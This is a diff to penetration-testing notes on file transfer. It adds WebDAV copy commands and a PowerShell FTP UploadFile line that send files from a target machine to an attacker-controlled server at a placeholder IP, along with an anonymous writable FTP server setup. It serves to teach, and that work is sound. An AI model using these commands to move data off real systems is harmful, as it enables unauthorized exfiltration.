@@ -113,11 +113,20 @@ sudo pip3 install wsgidav cheroot
 sudo wsgidav --host=<ip> --port=80 --root=/tmp --auth=anonymous
 ```
 
-To then connect to the server on the target:
+To then check a connection to the server on the target:
 ```cmd
-dir \\<ip>\
-```
+dir \\<ip>\DavWWWRoot
 
+dir \\<ip>\<sharename>
+```
+> The *DavWWWRoot* keyword is recognised by the Windows Shell. No folder exists on the server with that name but it tells the Mini-Redirector driver, which handles WebDAV, to connect to the root of the WebDAV server. This keyword can be avoided by specifying a folder that exists on the server.
+
+You can then upload files:
+```cmd
+copy <File Path> \\<ip>\DavWWWRoot\
+copy <File Path> \\<ip>\<sharefolder>\
+```
+> If there are no SMB restrictions on the target network, you can setup a normal SMB server like above for downloading via SMB.
 ## FTP Downloads
 Another alternative is to use port 20/21 for FTP file downloads.
 
@@ -129,5 +138,20 @@ sudo python3 -m pyftpdlib --port 21
 
 We can then download it via PowerShell on the target
 ```PowerShell
-(New-Object Net.WebClient).DownloadFile('ftp://<IP>/file.txt', '<Output File Location')
+(New-Object Net.WebClient).DownloadFile('ftp://<IP>/file.txt', '<Output File Location>')
+```
+
+## FTP Uploads
+Very similar to the downloading process.
+
+We can use `pyftpdlib` (a python ftp server library) to create an FTP server. By default it uses port *2121* so we can change this. It also has anonymous auth enabled by default too.
+> Additionally this time, we need to specify write permissions for users
+```bash
+sudo pip3 install pyftpdlib
+sudo python3 -m pyftpdlib --port 21 --write
+```
+
+We can then download it via PowerShell on the target
+```PowerShell
+(New-Object Net.WebClient).UploadFile('ftp://<IP>/file.txt', '<Input File Location>')
 ```
